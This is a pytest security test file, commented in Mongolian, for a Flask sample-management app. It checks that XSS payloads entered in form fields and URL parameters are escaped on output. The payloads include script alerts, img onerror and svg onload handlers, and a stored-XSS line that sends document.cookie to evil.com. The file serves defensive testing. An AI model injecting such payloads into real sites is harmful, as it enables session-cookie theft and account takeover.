# tests/security/test_xss.py
# -*- coding: utf-8 -*-
"""
XSS (Cross-Site Scripting) халдлагаас хамгаалалтын тестүүд

Jinja2 auto-escaping ашиглаж байгаа тул
XSS payload автоматаар escape хийгдэх ёстой.
"""

import pytest
from app.models import Sample


@pytest.mark.security
def test_xss_in_sample_code(client, auth):
    """Sample code-д XSS script оруулах оролдлого"""
    auth.login()

    # XSS payload
    xss_payload = '<script>alert("XSS")</script>'

    response = client.post('/create_sample', data={
        'sample_code': xss_payload,
        'client_name': 'XSS Test Client',
        'sample_type': 'Нүүрс',
        'weight': 2500,
        'analyses_to_perform': '["mt"]',
        'received_date': '2025-01-15 10:00'
    }, follow_redirects=True)

    assert response.status_code == 200

    # Database-д хадгалагдсан эсэхийг шалгах
    sample = Sample.query.filter_by(sample_code=xss_payload).first()
    if sample:
        # Sample code яг хадгалагдсан байх ёстой
        assert sample.sample_code == xss_payload

    # Template-д escape хийгдсэн эсэхийг шалгах
    response = client.get('/')
    html = response.data.decode('utf-8')

    # Script tag яг гүйцэтгэгдэхгүй (escape хийгдсэн)
    assert '<script>' not in html or '&lt;script&gt;' in html


@pytest.mark.security
def test_xss_in_client_name(client, auth):
    """Client name-д XSS payload оруулах"""
    auth.login()

    xss_payload = '<img src=x onerror="alert(\'XSS\')">'

    response = client.post('/create_sample', data={
        'sample_code': 'XSS-002',
        'client_name': xss_payload,
        'sample_type': 'Нүүрс',
        'weight': 2500,
        'analyses_to_perform': '["mt"]',
        'received_date': '2025-01-15 10:00'
    }, follow_redirects=True)

    assert response.status_code == 200

    # Template рендер шалгах
    response = client.get('/')
    html = response.data.decode('utf-8')

    # onerror event handler гүйцэтгэгдэхгүй байх ёстой
    # Escape: &lt;img src=x onerror=...&gt;
    assert 'onerror=' not in html or '&lt;img' in html


@pytest.mark.security
def test_xss_in_notes_field(client, auth):
    """Notes талбарт XSS payload"""
    auth.login()

    xss_payload = '<svg/onload=alert("XSS")>'

    response = client.post('/create_sample', data={
        'sample_code': 'XSS-003',
        'client_name': 'XSS Test',
        'sample_type': 'Нүүрс',
        'weight': 2500,
        'notes': xss_payload,
        'analyses_to_perform': '["mt"]',
        'received_date': '2025-01-15 10:00'
    }, follow_redirects=True)

    assert response.status_code == 200

    sample = Sample.query.filter_by(sample_code='XSS-003').first()
    assert sample is not None
    assert sample.notes == xss_payload

    # Template escape шалгах
    response = client.get(f'/edit_sample/{sample.id}')
    html = response.data.decode('utf-8')

    # SVG onload гүйцэтгэгдэхгүй
    assert 'onload=' not in html or '&lt;svg' in html


@pytest.mark.security
def test_xss_in_search_results(client, auth):
    """Хайлтын үр дүнд XSS escape"""
    auth.login()

    # XSS агуулсан дээж үүсгэх
    xss_code = '<b>Bold</b>'
    client.post('/create_sample', data={
        'sample_code': xss_code,
        'client_name': 'XSS Search Test',
        'sample_type': 'Нүүрс',
        'weight': 2500,
        'analyses_to_perform': '["mt"]',
        'received_date': '2025-01-15 10:00'
    }, follow_redirects=True)

    # DataTables API дуудах
    response = client.get('/api/data')
    assert response.status_code == 200

    data = response.get_json()
    if data and 'data' in data:
        # JSON-д escape хийгдсэн эсэхийг шалгах
        # DataTables client-side рендер дээр ч escape хийх ёстой
        found = False
        for row in data['data']:
            if xss_code in str(row):
                found = True
                # HTML tag-үүд escape хийгдэхгүй байж болно (JSON response)
                # Гэхдээ template рендер дээр escape хийгдэнэ

        # Template rendering шалгах
        response = client.get('/')
        html = response.data.decode('utf-8')
        # <b>Bold</b> → &lt;b&gt;Bold&lt;/b&gt;


@pytest.mark.security
def test_stored_xss_prevention(client, auth):
    """
    Stored XSS халдлага хамгаалалт

    Database-д хадгалагдсан XSS payload-г
    дараа нь template рендер дээр escape хийх ёстой.
    """
    auth.login()

    # Муу эрмэлзэлтэй payload
    xss_payload = '"><script>document.location="http://evil.com?cookie="+document.cookie</script>'

    # Database-д хадгалах
    response = client.post('/create_sample', data={
        'sample_code': 'STORED-XSS-001',
        'client_name': xss_payload,
        'sample_type': 'Нүүрс',
        'weight': 2500,
        'analyses_to_perform': '["mt"]',
        'received_date': '2025-01-15 10:00'
    }, follow_redirects=True)

    assert response.status_code == 200

    # Дараа нь уншиж рендер хийх
    sample = Sample.query.filter_by(sample_code='STORED-XSS-001').first()
    response = client.get(f'/edit_sample/{sample.id}')
    html = response.data.decode('utf-8')

    # Script гүйцэтгэгдэхгүй байх ёстой
    assert '<script>' not in html or '&lt;script&gt;' in html
    assert 'document.cookie' not in html or '&lt;script&gt;' in html


@pytest.mark.security
def test_reflected_xss_prevention(client, auth):
    """
    Reflected XSS халдлага хамгаалалт

    URL parameter-ээс ирсэн XSS payload-г
    template-д шууд харуулахдаа escape хийх ёстой.
    """
    auth.login()

    # URL parameter дээр XSS payload
    xss_payload = '<script>alert(document.domain)</script>'

    response = client.get(f'/api/sample_summary?filter_name={xss_payload}')
    html = response.data.decode('utf-8')

    # Script гүйцэтгэгдэхгүй байх ёстой
    assert '<script>' not in html or '&lt;script&gt;' in html


@pytest.mark.security
def test_dom_based_xss_prevention(client, auth):
    """
    DOM-based XSS халдлага хамгаалалт

    Client-side JavaScript код руу XSS payload дамжуулах оролдлого
    """
    auth.login()

    # JavaScript агуулсан payload
    xss_payload = '"; alert("XSS"); var x="'

    response = client.post('/create_sample', data={
        'sample_code': 'DOM-XSS-001',
        'client_name': xss_payload,
        'sample_type': 'Нүүрс',
        'weight': 2500,
        'analyses_to_perform': '["mt"]',
        'received_date': '2025-01-15 10:00'
    }, follow_redirects=True)

    # Template-д JavaScript escape хийгдэх ёстой
    response = client.get('/')
    html = response.data.decode('utf-8')

    # JavaScript injection амжилтгүй байх ёстой
    assert 'alert("XSS")' not in html or '&quot;; alert(' in html
